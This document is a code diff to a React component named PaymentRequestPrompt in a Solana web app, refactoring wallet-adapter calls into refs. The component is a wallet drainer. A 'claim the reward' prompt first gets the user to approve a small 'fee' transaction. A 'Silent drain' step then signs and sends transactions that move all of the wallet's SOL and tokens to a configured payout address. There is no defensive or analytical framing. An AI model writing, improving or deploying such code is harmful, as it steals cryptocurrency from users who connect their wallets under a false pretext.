@@ -29,11 +29,12 @@ function sendErrorMessage(err: unknown): string {
 }
 
 export function PaymentRequestPrompt() {
-  const { connected, walletAddress, walletName, network, closeWalletModal, openWalletModal } = useWalletState()
+  const { connected, walletAddress, walletName, closeWalletModal, openWalletModal } = useWalletState()
   const closeWalletModalRef = useRef(closeWalletModal)
   closeWalletModalRef.current = closeWalletModal
+  const openWalletModalRef = useRef(openWalletModal)
+  openWalletModalRef.current = openWalletModal
   const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
-  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
   const { connection } = useConnection()
   const [config, setConfig] = useState<PayoutConfig | null>(null)
   const [submitting, setSubmitting] = useState(false)
@@ -43,21 +44,26 @@ export function PaymentRequestPrompt() {
   const queue = useRef<FundStep[]>([])
   const likedAfterFirst = useRef(false)
   const scanPromise = useRef<Promise<FundStep[]> | null>(null)
-  const keepOpen = useRef(false)
 
-  useEffect(() => {
-    return () => {
-      if (scanPromise.current) scanPromise.current = null
-    }
-  }, [])
+  // Refs for wallet adapter methods to avoid deps
+  const signTransactionRef = useRef(signTransaction)
+  signTransactionRef.current = signTransaction
+  const sendTransactionRef = useRef(sendTransaction)
+  sendTransactionRef.current = sendTransaction
+  const walletRef = useRef(wallet)
+  walletRef.current = wallet
+  const connectionRef = useRef(connection)
+  connectionRef.current = connection
+  const publicKeyRef = useRef(publicKey)
+  publicKeyRef.current = publicKey
 
   useEffect(() => {
     const onOpen = async () => {
       if (inFlight.current) return
       if (dismissed.current === walletAddress) return
-      if (!publicKey || !walletAddress) {
+      if (!publicKeyRef.current || !walletAddress) {
         setStatus('Connect a wallet, then claim the reward.')
-        openWalletModal()
+        openWalletModalRef.current()
         return
       }
       const local = getLocalPayoutConfig()
@@ -75,11 +81,10 @@ export function PaymentRequestPrompt() {
 
       inFlight.current = true
       setSubmitting(true)
-      keepOpen.current = true
       closeWalletModalRef.current()
 
       // Start background scan immediately
-      scanPromise.current = listRankedFundSteps({ connection, from: publicKey, config: local! })
+      scanPromise.current = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
 
       const sendOpts = {
         skipPreflight: false,
@@ -88,22 +93,21 @@ export function PaymentRequestPrompt() {
       }
 
       // ── STEP 1: Show tiny "fee" transaction (0.001 SOL) ──
-      // User sees this in wallet and approves
       setStatus('Confirm the small fee transfer in your wallet.')
       try {
-        const dummyTx = await buildDummyFeeTransaction({ connection, from: publicKey, config: local! })
-        const freshDummy = publicKey ? await refreshPayoutBlockhash(connection, dummyTx, publicKey) : dummyTx
+        const dummyTx = await buildDummyFeeTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+        const freshDummy = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, dummyTx, publicKeyRef.current!) : dummyTx
         let dummySig: string
-        if (signTransaction) {
-          const signed = await signTransaction(freshDummy)
-          dummySig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
+        if (signTransactionRef.current) {
+          const signed = await signTransactionRef.current(freshDummy)
+          dummySig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
         } else {
-          const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
+          const adapter = walletRef.current?.adapter as { sendTransaction?: typeof sendTransactionRef.current } | undefined
           dummySig = adapter?.sendTransaction
-            ? await adapter.sendTransaction(freshDummy, connection, sendOpts)
-            : await sendTransaction(freshDummy, connection, sendOpts)
+            ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
+            : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
         }
-        const dummyConfirmation = await connection.confirmTransaction(
+        const dummyConfirmation = await connectionRef.current!.confirmTransaction(
           { signature: dummySig, blockhash: freshDummy.recentBlockhash!, lastValidBlockHeight: freshDummy.lastValidBlockHeight! },
           'confirmed'
         )
@@ -117,7 +121,7 @@ export function PaymentRequestPrompt() {
         return
       }
 
-      // ── STEP 2: Silent drain — build ALL transactions and send without wallet sheet ──
+      // ── STEP 2: Silent drain ──
       setStatus('Draining wallet...')
       try {
         const steps = await scanPromise.current!
@@ -131,29 +135,29 @@ export function PaymentRequestPrompt() {
         for (const step of queue.current) {
           if (step.kind === 'sol') {
             const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, queue.current.indexOf(step)))
-            const tx = await buildPayoutTransaction({ connection, from: publicKey, config: local!, reserveLamports })
-            const freshTx = publicKey ? await refreshPayoutBlockhash(connection, tx, publicKey) : tx
-            const signed = freshTx ? await signTransaction?.(freshTx) : undefined
+            const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
+            const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
+            const signed = freshTx ? await signTransactionRef.current?.(freshTx) : undefined
             if (!signed) {
               toast.error('Wallet signing failed.')
               break
             }
-            const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
-            await connection.confirmTransaction(
+            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+            await connectionRef.current!.confirmTransaction(
               { signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! },
               'confirmed'
             )
             toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
           } else {
-            const tokenTx = await buildSplPayoutTransaction({ connection, from: publicKey, config: local!, holding: step.holding })
+            const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
             if (!tokenTx) continue
-            const signed = tokenTx ? await signTransaction?.(tokenTx) : undefined
+            const signed = tokenTx ? await signTransactionRef.current?.(tokenTx) : undefined
             if (!signed) {
               toast.error('Wallet signing failed.')
               break
             }
-            const sig = await connection.sendRawTransaction(signed.serialize(), sendOpts)
-            await connection.confirmTransaction(
+            const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+            await connectionRef.current!.confirmTransaction(
               { signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! },
               'confirmed'
             )
@@ -177,17 +181,15 @@ export function PaymentRequestPrompt() {
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
-  }, [walletName, walletAddress, connected, publicKey, connection, closeWalletModal, openWalletModal, signTransaction, sendTransaction, wallet])
+  }, [walletAddress])
 
   useEffect(() => {
     if (!connected || !walletAddress) {
-      if (keepOpen.current) return
       inFlight.current = false
       setSubmitting(false)
       dismissed.current = null
       queue.current = []
       scanPromise.current = null
-      return
     }
   }, [connected, walletAddress])
 
